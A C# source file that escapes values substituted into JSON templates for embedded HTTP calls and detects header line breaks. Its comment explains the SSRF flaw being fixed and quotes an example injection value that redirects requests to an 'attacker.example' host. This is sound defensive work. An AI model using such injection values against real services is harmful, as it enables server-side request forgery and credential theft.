using System.Text;
using System.Text.RegularExpressions;

namespace DBToRestAPI.Services.HttpExecutor.Internal;

/// <summary>
/// Decides how a value must be encoded when it is substituted into a
/// <c>{http{ ... }http}</c> block.
///
/// WHY THIS EXISTS
/// ---------------
/// An embedded HTTP block is a JSON document held as TEXT, and markers are filled into that
/// text before it is parsed. Nothing escaped the substituted value, so a value containing a
/// double quote closed the JSON string it sat in and could append sibling keys. Because
/// <c>System.Text.Json</c> returns the LAST duplicate key, a value such as
/// <code>a","url":"https://attacker.example</code>
/// substituted into
/// <code>"url": "https://internal/api?x={{p}}"</code>
/// replaced the destination entirely - an arbitrary-host SSRF that also handed the block's
/// own credential headers (an API key, a bearer token) to the attacker's server.
///
/// WHY NOT SIMPLY ESCAPE EVERYTHING
/// --------------------------------
/// A marker is also allowed to sit OUTSIDE a string, where it injects a whole JSON document
/// on purpose - <c>"body": {{body_add}}</c> is a supported and used pattern. Escaping that
/// would turn a valid object into the broken literal <c>{\"a\":1}</c>. So the encoding has to
/// depend on WHERE the marker sits, which is what <see cref="MarkersInsideJsonStrings"/>
/// works out.
/// </summary>
internal static class EmbeddedHttpTemplate
{
    /// <summary>
    /// Matches both <c>{{name}}</c> and prefixed markers such as <c>{settings{name}}</c>.
    /// </summary>
    private static readonly Regex MarkerPattern =
        new(@"\{\w*\{(?<param>.*?)\}\}", RegexOptions.Compiled | RegexOptions.Singleline);

    /// <summary>
    /// Returns the marker names whose value would land INSIDE a JSON string literal, and
    /// therefore must be JSON-escaped. Names used outside a string are left out, so the
    /// deliberate "inject a whole JSON document" pattern keeps working.
    /// </summary>
    /// <param name="template">The inner text of a <c>{http{ ... }http}</c> block.</param>
    /// <param name="usedInBothContexts">
    /// Names that appear both inside and outside a string in the same block. Those are
    /// escaped (security wins), which will break their structural use - the caller should
    /// log this, because it means the block needs rewriting.
    /// </param>
    public static HashSet<string> MarkersInsideJsonStrings(
        string template,
        out HashSet<string> usedInBothContexts)
    {
        var insideString = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var structural = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        usedInBothContexts = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        if (string.IsNullOrEmpty(template))
            return insideString;

        var inString = false;

        for (var i = 0; i < template.Length; i++)
        {
            var c = template[i];

            if (inString)
            {
                // A backslash escapes the next character, so it cannot end the string.
                if (c == '\\') { i++; continue; }
                if (c == '"') { inString = false; continue; }
            }
            else
            {
                if (c == '"')
                {
                    inString = true;
                    continue;
                }

                // The request parser accepts JSON comments (JsonCommentHandling.Skip), so a
                // quote inside one must not toggle string state. Only checked OUTSIDE a
                // string, which is also what keeps the "//" in https:// from matching.
                if (c == '/' && i + 1 < template.Length)
                {
                    if (template[i + 1] == '/')
                    {
                        var eol = template.IndexOf('\n', i);
                        if (eol < 0) break;
                        i = eol;
                        continue;
                    }
                    if (template[i + 1] == '*')
                    {
                        var end = template.IndexOf("*/", i + 2, StringComparison.Ordinal);
                        if (end < 0) break;
                        i = end + 1;
                        continue;
                    }
                }
            }

            if (c != '{')
                continue;

            var match = MarkerPattern.Match(template, i);
            if (!match.Success || match.Index != i)
                continue;

            var name = match.Groups["param"].Value.Trim();
            if (name.Length > 0)
                (inString ? insideString : structural).Add(name);

            // Skip the marker body. It contains no quotes of its own, so string tracking
            // is unaffected.
            i = match.Index + match.Length - 1;
        }

        usedInBothContexts = new HashSet<string>(insideString, StringComparer.OrdinalIgnoreCase);
        usedInBothContexts.IntersectWith(structural);
        return insideString;
    }

    /// <summary>
    /// Escapes a value so it cannot terminate the JSON string literal it is substituted into.
    /// Deliberately minimal: it changes only characters that are illegal or structural inside
    /// a JSON string, so any value that was already well-formed passes through untouched and
    /// no existing configuration changes behaviour.
    /// </summary>
    public static string JsonEscape(string? value)
    {
        if (string.IsNullOrEmpty(value))
            return string.Empty;

        var sb = new StringBuilder(value.Length + 16);
        foreach (var c in value)
        {
            switch (c)
            {
                case '"': sb.Append("\\\""); break;
                case '\\': sb.Append("\\\\"); break;
                case '\b': sb.Append("\\b"); break;
                case '\f': sb.Append("\\f"); break;
                case '\n': sb.Append("\\n"); break;
                case '\r': sb.Append("\\r"); break;
                case '\t': sb.Append("\\t"); break;
                default:
                    if (c < ' ')
                        sb.Append("\\u").Append(((int)c).ToString("x4"));
                    else
                        sb.Append(c);
                    break;
            }
        }

        return sb.ToString();
    }

    /// <summary>
    /// True if the value carries a carriage return or line feed, which must never reach an
    /// HTTP header. Headers are added with TryAddWithoutValidation, so nothing else stops it.
    /// </summary>
    public static bool ContainsHeaderBreak(string? value)
        => value is not null && (value.Contains('\r') || value.Contains('\n'));
}
